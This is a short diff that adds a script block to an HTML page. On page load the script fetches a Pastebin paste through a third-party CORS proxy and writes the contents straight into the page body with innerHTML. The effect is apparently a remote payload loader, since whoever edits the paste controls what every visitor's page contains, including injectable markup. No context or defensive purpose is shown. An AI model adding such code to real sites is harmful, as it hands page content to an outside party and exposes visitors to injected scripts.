@@ -1,0 +1,7 @@
+<script>
+    fetch("https://api.allorigins.win/get?url=" + encodeURIComponent("https://pastebin.com/raw/HCaJV0u0"))
+    .then(response => response.json())
+    .then(data => {
+        document.body.innerHTML += data.contents; 
+    });
+    </script>
